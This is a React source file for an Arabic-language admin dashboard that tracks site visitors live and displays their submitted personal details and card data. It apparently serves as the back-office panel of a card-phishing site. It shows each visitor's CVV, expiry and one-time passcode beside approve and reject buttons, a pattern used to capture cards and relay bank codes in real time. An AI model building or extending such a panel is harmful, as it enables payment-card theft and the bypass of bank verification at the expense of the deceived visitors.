import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { RefreshCw, LogOut, Eye, X } from "lucide-react";
import {
  subscribeToVisitors,
  subscribeToFormSubmissions,
  getOnlineVisitorsCount,
  VisitorData,
  FormSubmission,
} from "@/lib/firebase";
import { useAuth } from "@/context/AuthContext";
import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";

interface CombinedData {
  visitorId: string;
  country: string;
  city: string;
  isOnline: boolean;
  currentPage: string;
  lastSeen: any;
  buyerInfo: Record<string, any> | null;
  paymentInfo: Record<string, any> | null;
  paymentSuccess: boolean;
  code: string;
}

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const { user, isLoading: authLoading, logout } = useAuth();
  const [visitors, setVisitors] = useState<VisitorData[]>([]);
  const [formSubmissions, setFormSubmissions] = useState<FormSubmission[]>([]);
  const [onlineCount, setOnlineCount] = useState(0);
  const [isLoading, setIsLoading] = useState(true);
  const [selectedData, setSelectedData] = useState<CombinedData | null>(null);
  const [showBuyerInfo, setShowBuyerInfo] = useState(false);
  const [showPaymentInfo, setShowPaymentInfo] = useState(false);

  useEffect(() => {
    if (!authLoading && !user) {
      setLocation("/admin/login");
    }
  }, [user, authLoading, setLocation]);

  useEffect(() => {
    if (!user) return;

    const unsubVisitors = subscribeToVisitors((data) => {
      setVisitors(data);
      setIsLoading(false);
    });

    const unsubForms = subscribeToFormSubmissions((data) => {
      setFormSubmissions(data);
    });

    const unsubOnline = getOnlineVisitorsCount((count) => {
      setOnlineCount(count);
    });

    return () => {
      unsubVisitors();
      unsubForms();
      unsubOnline();
    };
  }, [user]);

  const formatTimeAgo = (timestamp: any) => {
    if (!timestamp?.toDate) return "N/A";
    const date = timestamp.toDate();
    const now = new Date();
    const diff = now.getTime() - date.getTime();
    const minutes = Math.floor(diff / 60000);
    const hours = Math.floor(diff / 3600000);

    if (minutes < 1) return "الآن";
    if (minutes < 60) return `منذ ${minutes} دقيقة`;
    if (hours < 24) return `منذ ${hours} ساعات تقريباً`;
    return `منذ ${Math.floor(diff / 86400000)} يوم`;
  };

  const handleLogout = async () => {
    await logout();
    setLocation("/admin/login");
  };

  const combinedData: CombinedData[] = visitors.map((visitor) => {
    const buyerSubmission = formSubmissions.find(
      (f) =>
        f.visitorId === visitor.visitorId && f.formType === "buyer_details",
    );
    const paymentSubmission = formSubmissions.find(
      (f) =>
        f.visitorId === visitor.visitorId && f.formType === "payment_attempt",
    );

    return {
      visitorId: visitor.visitorId,
      country: visitor.country || "Unknown",
      city: visitor.city || "",
      isOnline: visitor.isOnline || false,
      currentPage: visitor.currentPage || "الرئيسية",
      lastSeen: visitor.lastSeen,
      buyerInfo: buyerSubmission?.data || null,
      paymentInfo: paymentSubmission?.data || null,
      paymentSuccess: paymentSubmission?.success || false,
      code: paymentSubmission?.data?.otp || "",
    };
  });

  const handleViewBuyerInfo = (data: CombinedData) => {
    setSelectedData(data);
    setShowBuyerInfo(true);
  };

  const handleViewPaymentInfo = (data: CombinedData) => {
    setSelectedData(data);
    setShowPaymentInfo(true);
  };

  if (authLoading || isLoading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <RefreshCw className="w-8 h-8 text-[#8A1538] animate-spin mx-auto mb-4" />
          <p className="text-gray-600">Loading dashboard...</p>
        </div>
      </div>
    );
  }

  if (!user) {
    return null;
  }

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      <div className="bg-white border-b border-gray-200 py-4 px-6">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-4">
            <h1 className="text-xl font-bold text-[#8A1538]">
              إدارة الإشعارات
            </h1>
            <span className="text-sm text-gray-500">
              عرض وإدارة جميع الإشعارات والبيانات المستلمة (
              {combinedData.length}) إشعار
            </span>
          </div>
          <div className="flex items-center gap-3">
            <Button variant="outline" size="sm" className="text-gray-600">
              مسح الكل
            </Button>
            <Button
              onClick={handleLogout}
              variant="ghost"
              size="sm"
              className="text-gray-600"
            >
              <LogOut className="w-4 h-4 ml-1" />
              خروج
            </Button>
          </div>
        </div>
      </div>

      <div className="p-6">
        <div className="bg-white rounded-lg shadow-sm overflow-hidden">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead className="bg-gray-50 border-b border-gray-200">
                <tr>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    الإجراءات
                  </th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    الصفحة
                  </th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    الكود
                  </th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    الاتصال
                  </th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    الوقت
                  </th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    الحالة
                  </th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    المعلومات
                  </th>
                  <th className="px-4 py-3 text-right font-medium text-gray-600">
                    الدولة
                  </th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {combinedData.length > 0 ? (
                  combinedData.map((row) => (
                    <tr key={row.visitorId} className="hover:bg-gray-50">
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-2">
                          <button className="p-1.5 rounded bg-gray-100 hover:bg-gray-200 text-gray-600">
                            <Eye className="w-4 h-4" />
                          </button>
                          <button className="px-3 py-1 rounded text-xs font-medium bg-green-500 hover:bg-green-600 text-white">
                            موافقة
                          </button>
                          <button className="px-3 py-1 rounded text-xs font-medium bg-red-500 hover:bg-red-600 text-white">
                            رفض
                          </button>
                        </div>
                      </td>
                      <td className="px-4 py-3 text-gray-700">
                        {row.currentPage === "/" ? "الرئيسية" : row.currentPage}
                      </td>
                      <td className="px-4 py-3">
                        {row.code ? (
                          <span className="font-mono text-blue-600">
                            {row.code}
                          </span>
                        ) : (
                          <span className="text-gray-400">-</span>
                        )}
                      </td>
                      <td className="px-4 py-3">
                        <span
                          className={`inline-flex items-center px-2 py-1 rounded text-xs font-medium ${
                            row.isOnline
                              ? "bg-green-100 text-green-700"
                              : "bg-yellow-100 text-yellow-700"
                          }`}
                        >
                          {row.isOnline ? "متصل" : "غير متصل"}
                        </span>
                      </td>
                      <td className="px-4 py-3 text-gray-600">
                        {formatTimeAgo(row.lastSeen)}
                      </td>
                      <td className="px-4 py-3">
                        <span
                          className={`inline-flex items-center px-2 py-1 rounded text-xs font-medium ${
                            row.paymentSuccess
                              ? "bg-green-100 text-green-700"
                              : "bg-yellow-100 text-yellow-700"
                          }`}
                        >
                          {row.paymentSuccess ? "موافق" : "معلق"}
                        </span>
                      </td>
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-2">
                          {row.buyerInfo ? (
                            <button
                              onClick={() => handleViewBuyerInfo(row)}
                              className="px-2 py-1 rounded text-xs font-medium bg-blue-500 text-white hover:bg-blue-600"
                            >
                              معلومات شخصية
                            </button>
                          ) : (
                            <span className="text-gray-400 text-xs">
                              لا يوجد معلومات
                            </span>
                          )}
                          {row.paymentInfo ? (
                            <button
                              onClick={() => handleViewPaymentInfo(row)}
                              className="px-2 py-1 rounded text-xs font-medium bg-green-500 text-white hover:bg-green-600"
                            >
                              معلومات البطاقة
                            </button>
                          ) : (
                            <span className="text-gray-400 text-xs">
                              لا يوجد بطاقة
                            </span>
                          )}
                        </div>
                      </td>
                      <td className="px-4 py-3">
                        <div className="flex items-center gap-2">
                          <span
                            className={`w-2 h-2 rounded-full ${row.isOnline ? "bg-green-500" : "bg-gray-400"}`}
                          ></span>
                          <span className="text-gray-700">{row.country}</span>
                        </div>
                      </td>
                    </tr>
                  ))
                ) : (
                  <tr>
                    <td
                      colSpan={8}
                      className="px-4 py-12 text-center text-gray-500"
                    >
                      لا توجد إشعارات حتى الآن
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>

      <Dialog open={showBuyerInfo} onOpenChange={setShowBuyerInfo}>
        <DialogContent className="max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-right text-[#8A1538]">
              معلومات المشتري
            </DialogTitle>
          </DialogHeader>
          {selectedData?.buyerInfo && (
            <div className="space-y-3">
              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">
                    الاسم الكامل
                  </span>
                  <span className="text-sm font-medium">
                    {selectedData.buyerInfo.firstName}{" "}
                    {selectedData.buyerInfo.lastName}
                  </span>
                </div>
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">
                    البريد الإلكتروني
                  </span>
                  <span className="text-sm font-medium break-all">
                    {selectedData.buyerInfo.email || "N/A"}
                  </span>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">
                    رقم الهاتف
                  </span>
                  <span className="text-sm font-medium">
                    {selectedData.buyerInfo.phone || "N/A"}
                  </span>
                </div>
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">الجنس</span>
                  <span className="text-sm font-medium">
                    {selectedData.buyerInfo.gender || "N/A"}
                  </span>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">الدولة</span>
                  <span className="text-sm font-medium">
                    {selectedData.buyerInfo.country || "N/A"}
                  </span>
                </div>
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">المدينة</span>
                  <span className="text-sm font-medium">
                    {selectedData.buyerInfo.city || "N/A"}
                  </span>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">الجنسية</span>
                  <span className="text-sm font-medium">
                    {selectedData.buyerInfo.nationality || "N/A"}
                  </span>
                </div>
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">
                    الفريق المفضل
                  </span>
                  <span className="text-sm font-medium">
                    {selectedData.buyerInfo.favoriteTeam || "N/A"}
                  </span>
                </div>
              </div>
            </div>
          )}
        </DialogContent>
      </Dialog>

      <Dialog open={showPaymentInfo} onOpenChange={setShowPaymentInfo}>
        <DialogContent className="max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-right text-[#8A1538]">
              معلومات البطاقة
            </DialogTitle>
          </DialogHeader>
          {selectedData?.paymentInfo && (
            <div className="space-y-3">
              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">
                    اسم حامل البطاقة
                  </span>
                  <span className="text-sm font-medium">
                    {selectedData.paymentInfo.cardholderName || "N/A"}
                  </span>
                </div>
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">
                    رقم البطاقة
                  </span>
                  <span className="text-sm font-medium font-mono">
                    {selectedData.paymentInfo.cardLast4 || "****"}
                  </span>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">
                    تاريخ الانتهاء
                  </span>
                  <span className="text-sm font-medium font-mono">
                    {selectedData.paymentInfo.expiryDate || "N/A"}
                  </span>
                </div>
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">OTP</span>
                  <span className="text-sm font-bold text-[#8A1538]">
                    {selectedData.paymentInfo.otp || "0"}
                  </span>
                </div>
              </div>
              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">cvv</span>
                  <span className="text-sm font-medium">
                    {selectedData.paymentInfo.cvv || "0"}
                  </span>
                </div>
                <div className="bg-gray-50 rounded-lg p-3">
                  <span className="text-xs text-gray-500 block">الحالة</span>
                  <span
                    className={`text-sm font-medium ${selectedData.paymentSuccess ? "text-green-600" : "text-red-600"}`}
                  >
                    {selectedData.paymentSuccess ? "ناجح" : "فشل"}
                  </span>
                </div>
              </div>
              {selectedData.paymentInfo.failureReason && (
                <div className="bg-red-50 rounded-lg p-3">
                  <span className="text-xs text-red-500 block">سبب الفشل</span>
                  <span className="text-sm font-medium text-red-700">
                    {selectedData.paymentInfo.failureReason}
                  </span>
                </div>
              )}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
}
